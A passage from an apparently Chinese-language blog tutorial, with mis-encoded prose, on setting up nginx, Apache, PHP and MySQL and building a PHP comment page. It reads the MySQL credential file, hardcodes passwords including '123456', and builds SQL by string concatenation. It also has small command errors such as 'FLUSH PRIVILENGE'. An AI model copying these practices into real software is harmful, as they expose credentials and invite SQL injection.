class="comment">#æ‰¾åˆ°å¯¹åº”çš„htmlæ–‡ä»¶å</span></span><br><span class="line">ls /var/www/html</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/cOAtGPxZU465afL.png" alt="image-20201031200343805"></p><p>åœ¨æµè§ˆå™¨ä¸­è®¿é—®<code> localhost/index.nginx-debian.html</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Tri23bY8EMU9KQy.png" alt="image-20201031200518986"></p><h1 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h1><h2 id="å®‰è£…PHP"><a href="#å®‰è£…PHP" class="headerlink" title="å®‰è£…PHP"></a>å®‰è£…PHP</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹phpç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -v</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/TIHsyvJMAjEt5D6.png" alt="image-20201031200705310"></p><p>å®‰è£…FastCgiåŠphpå¿…è¦æ‰©å±•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">apt-get install spawn-fcgi</span><br><span class="line">apt-get install php-pear</span><br><span class="line">apt-get install php7.4-cgi</span><br></pre></td></tr></table></figure><h2 id="ä¿®æ”¹nginxé…ç½®æ–‡ä»¶"><a href="#ä¿®æ”¹nginxé…ç½®æ–‡ä»¶" class="headerlink" title="ä¿®æ”¹nginxé…ç½®æ–‡ä»¶"></a>ä¿®æ”¹nginxé…ç½®æ–‡ä»¶</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#è®©å…¶æ”¯æŒphp</span></span><br><span class="line">vi /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><p>æ­¤è¡Œå¢åŠ index.php</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/OiYhyqUDEHl4z3M.png" alt="image-20201023215217976"></p><p>å»æ‰ä¸‹é¢éƒ¨åˆ†çš„æ³¨é‡Šç”¨äºæ”¯æŒphpè„šæœ¬,å»æ‰æ³¨é‡Šåå¦‚ä¸‹:</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/ayTLGlxUWXJfF7z.png" alt="image-20201023221149743"></p><p>é‡å¯nginxï¼ˆåœ¨ä¿®æ”¹é…ç½®æ–‡ä»¶åéœ€é‡å¯æœåŠ¡ï¼‰</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><h2 id="æŸ¥çœ‹PHPç›¸å…³ä¿¡æ¯"><a href="#æŸ¥çœ‹PHPç›¸å…³ä¿¡æ¯" class="headerlink" title="æŸ¥çœ‹PHPç›¸å…³ä¿¡æ¯"></a>æŸ¥çœ‹PHPç›¸å…³ä¿¡æ¯</h2><p>åœ¨è®¿é—®ç›®å½•ä¸‹åˆ›å»ºphpinfo.phpæ–‡ä»¶</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /var/www/html/</span><br></pre></td></tr></table></figure><p>ç¼–è¾‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åæµè§ˆå™¨ä¸­è®¿é—®<code> localhost/phpinfo.php</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/NLXfVKwi5W3UoZy.png" alt="image-20201031201415794"></p><h2 id="é…ç½®è™šæ‹Ÿä¸»æœº"><a href="#é…ç½®è™šæ‹Ÿä¸»æœº" class="headerlink" title="é…ç½®è™šæ‹Ÿä¸»æœº"></a>é…ç½®è™šæ‹Ÿä¸»æœº</h2><p>åˆ›å»ºä¸€ä¸ªtestæ–‡ä»¶(è™šæ‹Ÿä¸»æœºé…ç½®æ–‡ä»¶)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;test</span><br></pre></td></tr></table></figure><p>ç¼–è¾‘å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">       listen 80;</span><br><span class="line">       listen [::]:80;</span><br><span class="line"></span><br><span class="line">       server_name example.com;</span><br><span class="line"></span><br><span class="line">       root &#x2F;var&#x2F;www&#x2F;example.com;</span><br><span class="line">       index index.html;</span><br><span class="line"></span><br><span class="line">       location &#x2F; &#123;</span><br><span class="line">               try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">       &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é…ç½®åŸŸå</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p>å¢åŠ ä¸€è¡Œï¼š127.0.0.1    example.com</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/gKI5qMRse9xPDLo.png" alt="image-20201031203722330"></p><p>åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥åˆ° <code>/etc/nginx/sites-enabled/</code>ç›®å½•ä¸‹,ä½¿é…ç½®æ–‡ä»¶ç”Ÿæ•ˆ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s &#x2F;etc&#x2F;nginx&#x2F;sites-available&#x2F;test &#x2F;etc&#x2F;nginx&#x2F;sites-enabled&#x2F;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>/var/www/example.com</code>ä¸­åˆ›å»ºä¸€ä¸ª <code>index.html</code>ï¼Œå†…å®¹è‡ªå®šä¹‰ï¼Œé‡å¯nginxï¼Œè®¿é—®åœ°å€å¾—åˆ°</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/WQcDK73TIynb6a8.png" alt="image-20201031205422671"></p><h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><h2 id="å®‰è£…apache2"><a href="#å®‰è£…apache2" class="headerlink" title="å®‰è£…apache2"></a>å®‰è£…apache2</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install apache2</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹apacheç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache2 -v</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Hv6IhwSQXP7dAzG.png" alt="image-20201024172309352"></p><p>å®‰è£…php apache mod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libapache2-mod-php</span><br></pre></td></tr></table></figure><p>å®‰è£…phpæ’ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install php7.4-mysql php7.4-curl php7.4-gd php7.4-mbstring php7.4-zip </span><br></pre></td></tr></table></figure><h2 id="è®¿é—®apache2é¡µé¢"><a href="#è®¿é—®apache2é¡µé¢" class="headerlink" title="è®¿é—®apache2é¡µé¢"></a>è®¿é—®apache2é¡µé¢</h2><p>å¦‚æœä¹‹å‰å¼€å¯äº†NginxæœåŠ¡ï¼Œä¸ºé¿å…å†²çªï¼Œéœ€å…³é—­Nginxï¼Œå†æ‰“å¼€apache</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service nginx stop</span><br><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><p>è®¿é—® <code>localhost</code> </p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/SWsLDPz2uX4BMIb.png" alt="image-20201031205925779"></p><h2 id="æŸ¥çœ‹PHPç›¸å…³ä¿¡æ¯-1"><a href="#æŸ¥çœ‹PHPç›¸å…³ä¿¡æ¯-1" class="headerlink" title="æŸ¥çœ‹PHPç›¸å…³ä¿¡æ¯"></a>æŸ¥çœ‹PHPç›¸å…³ä¿¡æ¯</h2><p>åœ¨ <code>/var/www/html/</code> åˆ›å»º <code>phpinfo.php</code> ï¼Œ  è®¿é—®localhost/phpinfo.php</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/jCUKNYfocs7ku1I.png" alt="image-20201031211242600"></p><h2 id="é…ç½®è™šæ‹Ÿä¸»æœº-1"><a href="#é…ç½®è™šæ‹Ÿä¸»æœº-1" class="headerlink" title="é…ç½®è™šæ‹Ÿä¸»æœº"></a>é…ç½®è™šæ‹Ÿä¸»æœº</h2><p>ä¿®æ”¹æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf </span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;VirtualHost *:80&gt;</span><br><span class="line"></span><br><span class="line">ServerAdmin webmaster@localhost</span><br><span class="line">DocumentRoot &#x2F;var&#x2F;www&#x2F;html&#x2F;project</span><br><span class="line">ServerName www.youwen.com</span><br><span class="line"></span><br><span class="line">ErrorLog $&#123;APACHE_LOG_DIR&#125;&#x2F;error.log</span><br><span class="line">CustomLog $&#123;APACHE_LOG_DIR&#125;&#x2F;access.log combined</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;VirtualHost&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é‡å¯apache</p><p>ç„¶åé…ç½®åŸŸå,</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;hosts</span><br></pre></td></tr></table></figure><p>å¢åŠ ä¸€è¡Œå¦‚ä¸‹:</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/bG1F2M5LX9ETODS.png" alt="image-20201026231143988"></p><p>åœ¨å…ˆå‰è·¯å¾„æ–‡ä»¶ä¸‹åˆ›å»ºindex.phpæ–‡ä»¶,ç¼–è¾‘å¦‚ä¸‹:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;var&#x2F;www&#x2F;html&#x2F;project&#x2F;index.php</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/DvwdQ1fZczeoisW.png" alt="image-20201026231450732"></p><p>æ‰“å¼€æµè§ˆå™¨,è®¿é—® <a href="http://www.youwen.com/">www.youwen.com</a> å¯è§</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/I7YRjuQP6gNSU8v.png" alt="image-20201031213933587"></p><h1 id="MySQL"><a href="#MySQL" class="headerlink" title="MySQL"></a>MySQL</h1><h2 id="å®‰è£…MySQL"><a href="#å®‰è£…MySQL" class="headerlink" title="å®‰è£…MySQL"></a>å®‰è£…MySQL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mysql-server mysql-client</span><br></pre></td></tr></table></figure><p>å®‰è£…åè¿›è¡Œåˆå§‹åŒ–æ“ä½œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql_secure_installation </span><br></pre></td></tr></table></figure><p>â€“ä¸ºrootç”¨æˆ·è®¾ç½®å¯†ç <br>â€“åˆ é™¤åŒ¿åè´¦å·<br>â€“å–æ¶ˆrootç”¨æˆ·è¿œç¨‹ç™»å½•<br>â€“åˆ é™¤teståº“å’Œå¯¹teståº“çš„è®¿é—®æƒé™<br>â€“åˆ·æ–°æˆæƒè¡¨ä½¿ä¿®æ”¹ç”Ÿæ•ˆ</p><h2 id="ç™»å½•MySQL"><a href="#ç™»å½•MySQL" class="headerlink" title="ç™»å½•MySQL"></a>ç™»å½•MySQL</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/Fqc9rSLX1D8UK3Z.png" alt="image-20201024203846140"></p><p>æŸ¥çœ‹æ•°æ®åº“</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/duwv794bxMV2SyD.png" alt="image-20201101161119257"></p><p>é€€å‡º <code>quit</code></p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/b1Vv9aYjNLOrUKu.png" alt="image-20201024203932154"></p><h2 id="phpè¿æ¥mysql"><a href="#phpè¿æ¥mysql" class="headerlink" title="phpè¿æ¥mysql"></a>phpè¿æ¥mysql</h2><p>åœ¨èƒ½å¤Ÿè®¿é—®å¹¶å¤„ç†æ•°æ®åº“ä¸­çš„æ•°æ®ä¹‹å‰ï¼Œå¿…é¡»åˆ›å»ºåˆ°è¾¾æ•°æ®åº“çš„è¿æ¥ã€‚</p><p>åœ¨ PHP ä¸­ï¼Œè¿™ä¸ªä»»åŠ¡é€šè¿‡ mysqli_connect() å‡½æ•°å®Œæˆã€‚</p><p>è¿æ¥æ–¹å¼    MySQLi - é¢å‘è¿‡ç¨‹</p><p>åœ¨ /var/www/html/project åˆ›å»ºconnect.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$dbhost &#x3D; &#39;localhost&#39;;  &#x2F;&#x2F; mysqlæœåŠ¡å™¨ä¸»æœºåœ°å€</span><br><span class="line">$dbuser &#x3D; &#39;debian-sys-maint&#39;;            &#x2F;&#x2F; mysqlç”¨æˆ·å</span><br><span class="line">$dbpass &#x3D; &#39;PGpiTZ2V1aeDHuZg&#39;;          &#x2F;&#x2F; mysqlç”¨æˆ·åå¯†ç </span><br><span class="line">$conn &#x3D; mysqli_connect($dbhost, $dbuser, $dbpass);</span><br><span class="line">if(! $conn )</span><br><span class="line">&#123;</span><br><span class="line">    die(&#39;Could not connect: &#39; . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">echo &#39;æ•°æ®åº“è¿æ¥æˆåŠŸï¼&#39;;</span><br><span class="line">mysqli_close($conn);</span><br><span class="line">?&gt;         </span><br></pre></td></tr></table></figure><p>å®‰è£…åé»˜è®¤ç”¨æˆ·çš„ç”¨æˆ·ååŠå¯†ç å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;mysql&#x2F;debian.cnf</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/JKNwX7sTF29RZ6q.png" alt="image-20201030183122653"></p><p>éªŒè¯</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/tn8DE5mohjJ4GCI.png" alt="image-20201030182730755"></p><h1 id="Webç¯å¢ƒç®€å•åˆ©ç”¨"><a href="#Webç¯å¢ƒç®€å•åˆ©ç”¨" class="headerlink" title="Webç¯å¢ƒç®€å•åˆ©ç”¨"></a>Webç¯å¢ƒç®€å•åˆ©ç”¨</h1><p>è¿›ä¸€æ­¥å®Œå–„Apacheé…ç½®çš„è™šæ‹Ÿä¸»æœºï¼Œä½¿å…¶æ˜¾ç¤ºä¸€å¼ å›¾ç‰‡ï¼Œå›¾ç‰‡ä¸‹æ–¹å¸¦æœ‰è¯„è®ºè¾“å…¥æ¡†ï¼Œå¯ä»¥æäº¤è¯„è®ºï¼Œæäº¤çš„è¯„è®ºå­˜åˆ°ä¸»æœºçš„ mysql æ•°æ®åº“ä¸­ï¼Œè€Œåæ˜¾ç¤ºåœ¨è¯„è®ºåŒºï¼Œæœ€åå®Œæˆçš„å¤§è‡´å¦‚ä¸‹å›¾ï¼Œæ˜¯ç®€é™‹äº†ç‚¹ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304111640438.png" alt="image-20210304111640438"></p><h2 id="è®¾ç½®mysql"><a href="#è®¾ç½®mysql" class="headerlink" title="è®¾ç½®mysql"></a>è®¾ç½®mysql</h2><p>åœ¨ mysql ä¸­åˆ›å»ºä¸€ä¸ªæ–°ç”¨æˆ·ï¼Œå¹¶æˆæƒ INSERTã€SELECT ç­‰æƒé™ï¼Œè¯„è®ºå†…å®¹éœ€è¦å­˜åˆ°æ•°æ®åº“ï¼Œå¹¶è¯»å–æ•°æ®åº“å†…å®¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºæ–°ç”¨æˆ·wywå¹¶è®¾ç½®å¯†ç </span></span><br><span class="line">mysql&gt;</span><br><span class="line">CREATE USER <span class="string">&#x27;wyw&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="comment"># ä¸ºç”¨æˆ·æˆæƒ</span></span><br><span class="line">GRANT INSERT,SELECT ON *.* TO <span class="string">&#x27;wyw&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br><span class="line"><span class="comment"># åˆ·æ–°</span></span><br><span class="line">FLUSH PRIVILENGE;</span><br></pre></td></tr></table></figure><p>é€€å‡ºmysqlï¼Œä»¥æ–°åˆ›å»ºçš„ç”¨æˆ·é‡æ–°ç™»é™†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql -u wyw -p</span><br></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªåº“å’Œè¡¨å¹¶æ’å…¥æ•°æ®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">create database webdb;</span><br><span class="line">use webdb;</span><br><span class="line">create table comments (id int auto_increment primary key,comment varchar(200) not null);</span><br><span class="line">insert into comments(comment) values (&#39;test&#39;);</span><br></pre></td></tr></table></figure><h2 id="è¿æ¥mysql"><a href="#è¿æ¥mysql" class="headerlink" title="è¿æ¥mysql"></a>è¿æ¥mysql</h2><p>ç¼–å†™<code>index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML&gt;</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;style&gt;</span><br><span class="line"> .<span class="built_in">error</span> &#123;color: <span class="comment">#FF0000;&#125;</span></span><br><span class="line"> img &#123;</span><br><span class="line">     width: <span class="number">30</span>%;</span><br><span class="line">     height: auto;</span><br><span class="line"> &#125;</span><br><span class="line"> td &#123;</span><br><span class="line">     border: <span class="number">1</span>px solid black;</span><br><span class="line"> &#125;</span><br><span class="line"> &lt;/style&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt; </span><br><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;connect.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"> <span class="variable">$comment</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"> <span class="variable">$commentErr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] == <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">   <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;comment&quot;</span>])) &#123;</span><br><span class="line">     <span class="variable">$commentErr</span> = <span class="string">&quot;You must write someting...&quot;</span>;</span><br><span class="line">   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     <span class="variable">$comment</span> = test_input(<span class="variable">$_POST</span>[<span class="string">&quot;comment&quot;</span>]);</span><br><span class="line">     <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO comments (comment) VALUES (&#x27;&quot;</span>.<span class="variable">$comment</span>.<span class="string">&quot;&#x27;)&quot;</span>;</span><br><span class="line">     <span class="keyword">if</span> (mysqli_query(<span class="variable">$dbcon</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">         <span class="variable">$commentErr</span> = <span class="string">&quot;Submit comment successfully!&quot;</span>;</span><br><span class="line">     &#125;</span><br><span class="line">     <span class="keyword">else</span> &#123;</span><br><span class="line">         <span class="variable">$commentErr</span> = <span class="string">&quot;Error:&quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="variable">$dbcon</span>);</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">test_input</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">   <span class="variable">$data</span> = trim(<span class="variable">$data</span>);</span><br><span class="line">   <span class="variable">$data</span> = stripslashes(<span class="variable">$data</span>);</span><br><span class="line">   <span class="variable">$data</span> = htmlspecialchars(<span class="variable">$data</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"> &lt;h1&gt;Wawyw<span class="string">&#x27;s HomePage&lt;/h1&gt;</span></span><br><span class="line"><span class="string"> &lt;img src=&#x27;</span>https:<span class="comment">//images-1304906399.cos.ap-guangzhou.myqcloud.com/images/wallpaper.png&#x27; alt=&#x27;homepage image&#x27;&gt;</span></span><br><span class="line"> &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&lt;?php echo htmlspecialchars(<span class="subst">$_SERVER</span>[&quot;</span>PHP_SELF<span class="string">&quot;]);?&gt;&quot;</span>&gt;</span><br><span class="line">   &lt;hr&gt;</span><br><span class="line">   &lt;p&gt;Wirte your comment here!&lt;/p&gt;</span><br><span class="line">   &lt;textarea name=<span class="string">&quot;comment&quot;</span> rows=<span class="string">&quot;5&quot;</span> cols=<span class="string">&quot;80&quot;</span>&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$comment</span>;<span class="meta">?&gt;</span>&lt;/textarea&gt;</span><br><span class="line">   &lt;span class=&#x27;error&#x27;&gt;*&lt;?php echo $commentErr; ?&gt;&lt;/span&gt;</span><br><span class="line">   &lt;br&gt;&lt;/br&gt;</span><br><span class="line">   &lt;input type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;submit&quot;</span> value=<span class="string">&quot;submit&quot;</span>&gt;</span><br><span class="line">   &lt;hr&gt;</span><br><span class="line"> &lt;/form&gt;</span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"> <span class="variable">$sqlget</span> = <span class="string">&quot;SELECT * FROM comments&quot;</span>;</span><br><span class="line"> <span class="variable">$sqldata</span> = mysqli_query(<span class="variable">$dbcon</span>, <span class="variable">$sqlget</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Fail to connect to database!&quot;</span> .  mysqli_error(<span class="variable">$dbcon</span>));</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;table&gt;&quot;</span>;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;th&gt;Comments&lt;/th&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">while</span>(<span class="variable">$row</span> = mysqli_fetch_array(<span class="variable">$sqldata</span>, MYSQLI_ASSOC)) &#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span>;</span><br><span class="line">     <span class="keyword">echo</span> <span class="variable">$row</span>[<span class="string">&#x27;comment&#x27;</span>];</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;&lt;/table&gt;&quot;</span>;</span><br><span class="line"> <span class="meta">?&gt;</span></span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å¯¹<code>connect.php</code>è¿›è¡Œä¿®æ”¹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dbhost</span> = <span class="string">&#x27;localhost&#x27;</span>; </span><br><span class="line"><span class="variable">$dbuser</span> = <span class="string">&#x27;wyw&#x27;</span>;          </span><br><span class="line"><span class="variable">$dbpass</span> = <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"><span class="variable">$dbname</span> = <span class="string">&#x27;webdb&#x27;</span>;</span><br><span class="line"><span class="variable">$dbcon</span> = mysqli_connect(<span class="variable">$dbhost</span>, <span class="variable">$dbuser</span>, <span class="variable">$dbpass</span>, <span class="variable">$dbname</span>);</span><br><span class="line"><span class="keyword">if</span>(! <span class="variable">$dbcon</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . mysqli_error());</span><br><span class="line">&#125;</span><br><span class="line">mysqli_close(<span class="variable">$conn</span>);</span><br><span class="line"><span 